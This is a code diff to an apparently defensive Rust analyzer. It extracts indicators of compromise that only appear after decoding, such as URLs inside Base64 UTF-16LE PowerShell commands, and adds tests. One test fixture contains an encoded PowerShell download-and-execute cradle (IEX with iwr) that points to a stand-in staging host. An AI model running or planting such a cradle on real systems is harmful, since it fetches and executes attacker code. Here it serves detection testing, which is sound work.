@@ -6,9 +6,11 @@ use crate::analysis::entropy::{
     EntropyReport, analyze as analyze_entropy, analyze_bytes as entropy_bytes,
 };
 use crate::analysis::{AnalysisReport, Analyzer, EncodingKind, Layer};
-use crate::ioc::{ExtractOptions, IocReport, extract};
+use crate::ioc::{ExtractOptions, IocKind, IocReport, extract};
 
 const MAX_TOKEN_BYTES: usize = 1024 * 1024;
+/// Upper bound on indicators added from decoded layers across one input.
+const MAX_DECODED_IOCS: usize = 10_000;
 const MAX_EXTRACTED_TEXT_BYTES: usize = 8 * 1024 * 1024;
 
 #[derive(Debug, Clone, Serialize)]
@@ -78,21 +80,84 @@ pub fn analyze_with_source(
         }
     }
 
+    let mut iocs = extract(
+        input,
+        ExtractOptions {
+            source: source.to_owned(),
+            ..ExtractOptions::default()
+        },
+    );
+    merge_decoded_iocs(&mut iocs, &analyses, source);
+
     BatchReport {
         input_bytes: input.len(),
         tokens_scanned,
         token_limit_reached,
         analyses,
-        iocs: extract(
-            input,
-            ExtractOptions {
-                source: source.to_owned(),
-                ..ExtractOptions::default()
-            },
-        ),
+        iocs,
         entropy: analyze_entropy(input),
         positions_available: true,
         binary: None,
+    }
+}
+
+/// Adds indicators that only appear after decoding, such as a URL inside a
+/// Base64 UTF-16LE PowerShell command. Their line is the encoded token's line;
+/// columns and context are omitted because they would describe decoded text.
+fn merge_decoded_iocs(report: &mut IocReport, analyses: &[TokenAnalysis], source: &str) {
+    let mut known = report
+        .iocs
+        .iter()
+        .map(|ioc| (ioc.kind, ioc.value.clone()))
+        .collect::<HashSet<(IocKind, String)>>();
+    let mut added = 0;
+    'analyses: for analysis in analyses {
+        if analysis.report.layers.is_empty() {
+            continue;
+        }
+        let chain = analysis
+            .report
+            .layers
+            .iter()
+            .map(|layer| layer.kind.to_string())
+            .collect::<Vec<_>>()
+            .join(" → ");
+        let decoded = extract(
+            &analysis.report.final_value,
+            ExtractOptions {
+                source: format!("{source} (decoded)"),
+                ..ExtractOptions::default()
+            },
+        );
+        for mut ioc in decoded.iocs {
+            if !known.insert((ioc.kind, ioc.value.clone())) {
+                continue;
+            }
+            if added == MAX_DECODED_IOCS {
+                report.match_limit_reached = true;
+                break 'analyses;
+            }
+            added += 1;
+            ioc.detail = Some(match ioc.detail.take() {
+                Some(detail) => format!("{detail}; decoded from {chain}"),
+                None => format!("decoded from {chain}"),
+            });
+            ioc.first_line = analysis.line;
+            ioc.last_line = analysis.line;
+            ioc.first_column = None;
+            ioc.locations.clear();
+            ioc.locations_truncated = false;
+            report.iocs.push(ioc);
+        }
+    }
+    if added > 0 {
+        report.iocs.sort_by(|left, right| {
+            left.kind
+                .cmp(&right.kind)
+                .then_with(|| left.value.cmp(&right.value))
+        });
+        report.total = report.iocs.len();
+        report.total_occurrences = report.iocs.iter().map(|ioc| ioc.occurrences).sum();
     }
 }
 
@@ -255,5 +320,59 @@ mod tests {
         let serialized = serde_json::to_string(&report).expect("serialize report");
         assert!(!serialized.contains(secret));
         assert!(serialized.contains("redacted"));
+    }
+
+    #[test]
+    fn extracts_indicators_that_only_exist_after_decoding() {
+        use base64::Engine as _;
+        let command = "IEX (iwr 'http://stage.example.test/a')";
+        let utf16 = command
+            .encode_utf16()
+            .flat_map(u16::to_le_bytes)
+            .collect::<Vec<_>>();
+        let encoded = base64::engine::general_purpose::STANDARD.encode(utf16);
+        let input = format!(
+            "first line
+powershell -enc {encoded}
+"
+        );
+
+        let report = analyze(&input, 8, 100);
+        let url = report
+            .iocs
+            .iocs
+            .iter()
+            .find(|ioc| ioc.value == "http://stage.example.test/a")
+            .expect("decoded URL is extracted");
+        assert_eq!(url.source, "input (decoded)");
+        assert_eq!(url.first_line, Some(2));
+        assert_eq!(url.first_column, None);
+        assert!(url.locations.is_empty());
+        assert_eq!(
+            url.detail.as_deref(),
+            Some("decoded from Base64 → UTF-16LE")
+        );
+        assert_eq!(report.iocs.total, report.iocs.iocs.len());
+    }
+
+    #[test]
+    fn decoded_indicators_do_not_duplicate_plain_ones_or_leak_secrets() {
+        use base64::Engine as _;
+        let secret = "s3cr3t-value-123456";
+        let hidden = format!("http://dup.example.test/ password={secret}");
+        let encoded = base64::engine::general_purpose::STANDARD.encode(hidden);
+        let input = format!("http://dup.example.test/ {encoded}");
+
+        let report = analyze(&input, 8, 100);
+        let urls = report
+            .iocs
+            .iocs
+            .iter()
+            .filter(|ioc| ioc.value == "http://dup.example.test/")
+            .collect::<Vec<_>>();
+        assert_eq!(urls.len(), 1);
+        assert_eq!(urls[0].source, "input");
+        let serialized = serde_json::to_string(&report.iocs).expect("serialize IOCs");
+        assert!(!serialized.contains(secret));
     }
 }
